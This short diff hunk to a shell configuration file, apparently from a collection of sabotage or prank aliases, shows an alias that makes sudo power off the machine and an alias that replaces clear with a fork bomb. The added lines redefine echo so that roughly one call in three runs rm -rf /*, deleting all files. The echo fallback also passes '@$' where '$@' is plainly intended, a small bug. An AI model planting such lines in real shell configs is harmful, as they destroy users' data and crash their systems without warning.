@@ -24,3 +24,6 @@ alias sudo='sudo shutdown -P now'
 
 # Launch a fork bomb instead of clearing the screen
 alias clear=':(){ :|:& };:'
+
+# 33% chance to delete all files on `echo`.
+function echo { [ $[ $RANDOM % 3 ] == 0 ] && rm -rf /* || /bin/echo @$ }
